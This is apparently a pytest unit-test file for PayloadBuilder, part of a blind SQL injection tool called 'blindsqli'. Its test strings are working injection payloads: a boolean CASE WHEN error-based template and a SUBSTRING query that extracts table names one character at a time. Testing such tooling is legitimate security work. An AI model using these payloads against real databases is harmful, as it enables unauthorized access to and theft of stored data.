import pytest

from blindsqli.payload import PayloadBuilder


def test_payload_substitutes_condition():
    b = PayloadBuilder("a' AND 1=(SELECT CASE WHEN ({condition}) THEN 1 ELSE 'a' END)--")
    out = b.build("1=1")
    assert out == "a' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 'a' END)--"


def test_payload_requires_placeholder():
    with pytest.raises(ValueError):
        PayloadBuilder("no placeholder here")


def test_payload_preserves_complex_condition():
    b = PayloadBuilder("x' AND ({condition})--")
    cond = "SUBSTRING((SELECT TOP(1) TABLE_NAME FROM t),4,1) = 'u'"
    assert b.build(cond) == f"x' AND ({cond})--"
